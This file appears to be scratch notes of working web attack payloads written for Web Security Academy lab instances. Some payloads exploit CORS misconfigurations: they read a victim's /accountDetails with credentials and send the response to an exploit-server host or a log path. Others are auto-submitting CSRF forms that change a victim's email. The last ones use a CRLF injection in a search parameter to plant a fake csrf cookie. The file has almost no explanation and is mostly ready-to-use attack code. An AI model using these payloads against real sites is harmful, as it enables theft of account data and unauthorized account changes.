

var xhr = new XMLHttpRequest();

xhr.open("GET", "https://0a5d00f304048a7c82ed74fa00a00087.web-security-academy.net/accountDetails")
// xhr.setRequestHeader("Authorization", "Bearer YOUR_ACCESS_TOKEN");
xhr.withCredentials = true; // Include cookies

// Define a callback function to handle the response
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) { // Request is complete
        if (xhr.status === 200) { // Successful response
            console.log("Response:", xhr.responseText);
        } else {
            console.error("Error:", xhr.status, xhr.statusText);
        }
    }
};

xhr.send()


var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a5d00f304048a7c82ed74fa00a00087.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	var xhr = new XMLHttpRequest();
    xhr.open("GET", "/log/"+ req.response)
    xhr.send()
};



var xhr = new XMLHttpRequest()
xhr.open("GET", "https://0afc00cf04cf478b9db0ba43003b00c6.web-security-academy.net/accountDetails" )
xhr.withCredentials = true; // Include cookies
xhr.send()

xhr.onload(function(){
    console.log(xhr.response)
    var xhr2 = new XMLHttpRequest()
    xhr2.open("GET", "/loooooooog/"+xhr.response)

})


<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,&lt;script&gt;
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0ae100d303512e7680bfada000470096.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
    var asdds = new XMLHttpRequest();
    asdds.open('GET', 'https://exploit-0a54003d03822e708059ac1601ba004d.exploit-server.net/exploit'+ this.responseText);
    asdds.send();
};
&lt;/script&gt;">
</iframe>



a = new XMLHttpRequest();
a.open("POST", "https://0af600c00361b1db802f4e2b00ce00be.web-security-academy.net/my-account/change-email" , true);
a.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
a.withCredentials = true;
a.send('email=12345@12345')



a= new XMLHttpRequest();
a.open("POST", "https://0a9a00fc0451eef6b64f82e0007300fd.web-security-academy.net/my-account/change-email")
a.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
a.withCredentials = true;
a.send("email=test1234567@test1234")


b= new XMLHttpRequest();
b.open("POST", "https://exploit-0ada0067042d314f80ec021e0194001d.exploit-server.net/ooooooooooooooooooookkkkkk")
b.withCredentials = true;
b.send('email=12345@12345');
a= new XMLHttpRequest();
a.open("POST", "https://0a570077040031bf80680327009a00bb.web-security-academy.net/my-account/change-email")
a.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
a.withCredentials = true;
a.send('email=sdadas5@1345');



<form action="https://0abc00e9044b31b380b5211e003400a0.web-security-academy.net/my-account/change-email" method="POST">
<input name="email" value="s123@123321312">
<input name="csrf" value="gCLOsDYh3tIuQ8QhAYmzRzuZPKWJ02iJ">
</form>
<script>
document.forms[0].submit();
</script>





<form action="https://0a19004b047ddcb681beca5b006800b4.web-security-academy.net/my-account/change-email" method="POST">
    <input name="email" value="s1hgghfgf@12hgf">
    <input name="csrf" value="fake">
</form>
<script>

xhr = new XMLHttpRequest();
xhr.open("GET", "https://0a19004b047ddcb681beca5b006800b4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None");
xhr.withCredentials = true;
xhr.send();

setTimeout(() => {
    console.log('This runs after 2 seconds');
    document.forms[0].submit();
}, 1000); // Wait for 2000 milliseconds (2 seconds)


</script>


'%0d%0a' = \r\n 


<form action="https://0a19004b047ddcb681beca5b006800b4.web-security-academy.net/my-account/change-email" method="POST">
    <input name="email" value="tset@test">
    <input name="csrf" value="fake">
</form>
<img src="https://0a19004b047ddcb681beca5b006800b4.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"></img>